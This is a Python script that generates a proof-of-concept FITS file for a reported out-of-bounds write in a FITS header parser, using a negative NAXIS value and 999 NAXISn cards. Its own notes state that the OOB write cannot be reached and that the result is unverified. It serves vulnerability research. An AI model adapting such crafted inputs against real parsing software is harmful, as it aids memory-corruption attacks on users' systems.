#!/usr/bin/env python3
"""
PoC generator for VULN 001:
Stack OOB Write via Unchecked NAXIS Value in FITS Header Parser (fits.c)

FITSHeader.naxisn is declared as int naxisn[999] (valid indices 0..998).
The vulnerable write is:
    sscanf(value, "%d", &header->naxisn[header->naxis_index])   // line 181

There is no check that naxis_index < 999 before this write.

IMPORTANT CONSTRAINT discovered during analysis:
  FITS keywords are limited to 8 characters.  "NAXIS" (5 chars) + decimal digits
  leaves 3 characters, so the maximum representable dim_no from the keyword
  "NAXIS999" is 999.  The keyword check at line 176 (BEFORE the write) is:
      if (ret != 1 || dim_no != header->naxis_index + 1)
  When naxis_index=999, dim_no must be 1000 — but "NAXIS1000" is 9 chars,
  truncated to "NAXIS100" (dim_no=100).  100 != 1000 → AVERROR_INVALIDDATA is
  returned BEFORE the OOB write happens.

  Therefore the exact naxisn[999] OOB write described in the report cannot be
  triggered via a standard FITS file.  This PoC demonstrates the reachable
  code path and the missing bounds check through:
    - NAXIS set to -1 (negative, accepted — no non-negativity check)
    - 999 NAXISn cards (NAXIS1..NAXIS999), all in-bounds writes
    - Parser then fails at NAXIS1000 due to keyword truncation (not OOB)
  Status will be UNVERIFIED (parse error, no ASAN crash).

FITS format:
  - Each card (header line) is exactly 80 bytes.
  - A block is 2880 bytes = 36 cards.
  - Logical/integer values are right-justified in columns 11-30 (indices 10-29).
  - The '=' value indicator is at column 9 (index 8).
"""

import struct

BLOCK_SIZE = 2880
CARD_SIZE  = 80

def fits_card(keyword, integer_value=None, comment=""):
    """
    Build a proper 80-byte FITS header card.
    Integer/logical values are right-justified in the 20-char value field
    (columns 11-30, indices 10-29).  This matches what the probe check
    expects: SIMPLE  =                    T
    """
    if integer_value is None:
        # END or comment card — just pad keyword to 80 chars
        line = f"{keyword:<80}"[:80]
        return line.encode('ascii')

    kw = f"{keyword:<8}"[:8]          # 8-char keyword (padded / truncated)
    val_str = str(integer_value)
    # Value field is columns 11-30 (20 chars), right-justified
    val_field = f"{val_str:>20}"
    if comment:
        # Column 31 onwards: " / comment"
        comment_field = f" / {comment}"
        rest = comment_field[:50]
    else:
        rest = ""
    line = f"{kw}= {val_field}{rest}"
    line = f"{line:<80}"[:80]
    assert len(line) == 80, f"card length {len(line)}: {line!r}"
    return line.encode('ascii')

def fits_logical_card(keyword, value_char, comment=""):
    """Build a logical (T/F) FITS card with value right-justified at col 30."""
    kw = f"{keyword:<8}"[:8]
    # 20-char value field, logical value right-justified (T or F at position 29)
    val_field = f"{value_char:>20}"
    if comment:
        rest = f" / {comment}"[:50]
    else:
        rest = ""
    line = f"{kw}= {val_field}{rest}"
    line = f"{line:<80}"[:80]
    assert len(line) == 80
    return line.encode('ascii')

def build_fits(naxis_value=-1, num_naxisn_cards=999):
    """
    Build a FITS file with:
      SIMPLE  = T
      BITPIX  = 8
      NAXIS   = naxis_value   (set to -1 so stop-condition naxis_index==naxis
                               is never true; -1 accepted because no >=0 check)
      NAXIS1..NAXISn = 1      (n = num_naxisn_cards, all in-bounds writes)
      END
    With NAXIS=-1 and 999 NAXISn cards the parser writes naxisn[0..998] (valid),
    then tries NAXIS1000 whose keyword truncates to NAXIS100 (dim_no=100),
    failing the sequential check (100 != 1000) before any OOB write.
    """
    cards = []

    # Probe check: first 30 bytes must be "SIMPLE  =                    T"
    cards.append(fits_logical_card("SIMPLE", "T", "conforms to FITS standard"))
    cards.append(fits_card("BITPIX", 8, "array data type: 8-bit unsigned"))
    cards.append(fits_card("NAXIS", naxis_value,
                            "negative: stop-cond naxis_index==naxis never fires"))

    # NAXISn cards — indices 0..(num_naxisn_cards-1) in naxisn[]
    # All writes stay within naxisn[0..998] (valid), demonstrating the
    # missing upper-bound check in the STATE_NAXIS_N branch.
    for n in range(1, num_naxisn_cards + 1):
        cards.append(fits_card(f"NAXIS{n}", 1))

    # END card
    end_card = b"END" + b" " * 77
    cards.append(end_card)

    raw = b"".join(cards)
    remainder = len(raw) % BLOCK_SIZE
    if remainder:
        raw += b" " * (BLOCK_SIZE - remainder)

    # One zero-filled data block
    raw += b"\x00" * BLOCK_SIZE
    return raw


if __name__ == "__main__":
    out = "vuln_001_input.fits"
    data = build_fits(naxis_value=-1, num_naxisn_cards=999)
    with open(out, "wb") as f:
        f.write(data)

    # Verify probe check
    probe_expected = b"SIMPLE  =                    T"
    assert data[:30] == probe_expected, \
        f"Probe mismatch!\n  got: {data[:30]!r}\n  exp: {probe_expected!r}"

    print(f"[+] Written {len(data)} bytes to {out}")
    print(f"[+] First 30 bytes match FITS probe signature: {data[:30]!r}")
    print(f"[+] NAXIS=-1: stop condition naxis_index==naxis unreachable")
    print(f"[+] 999 NAXISn cards drive naxis_index through 0..998 (in-bounds)")
    print(f"[+] NAXIS1000 keyword truncation prevents OOB write at naxisn[999]")
    print(f"[+] Missing bounds check at fits.c:181 is the target vulnerability")
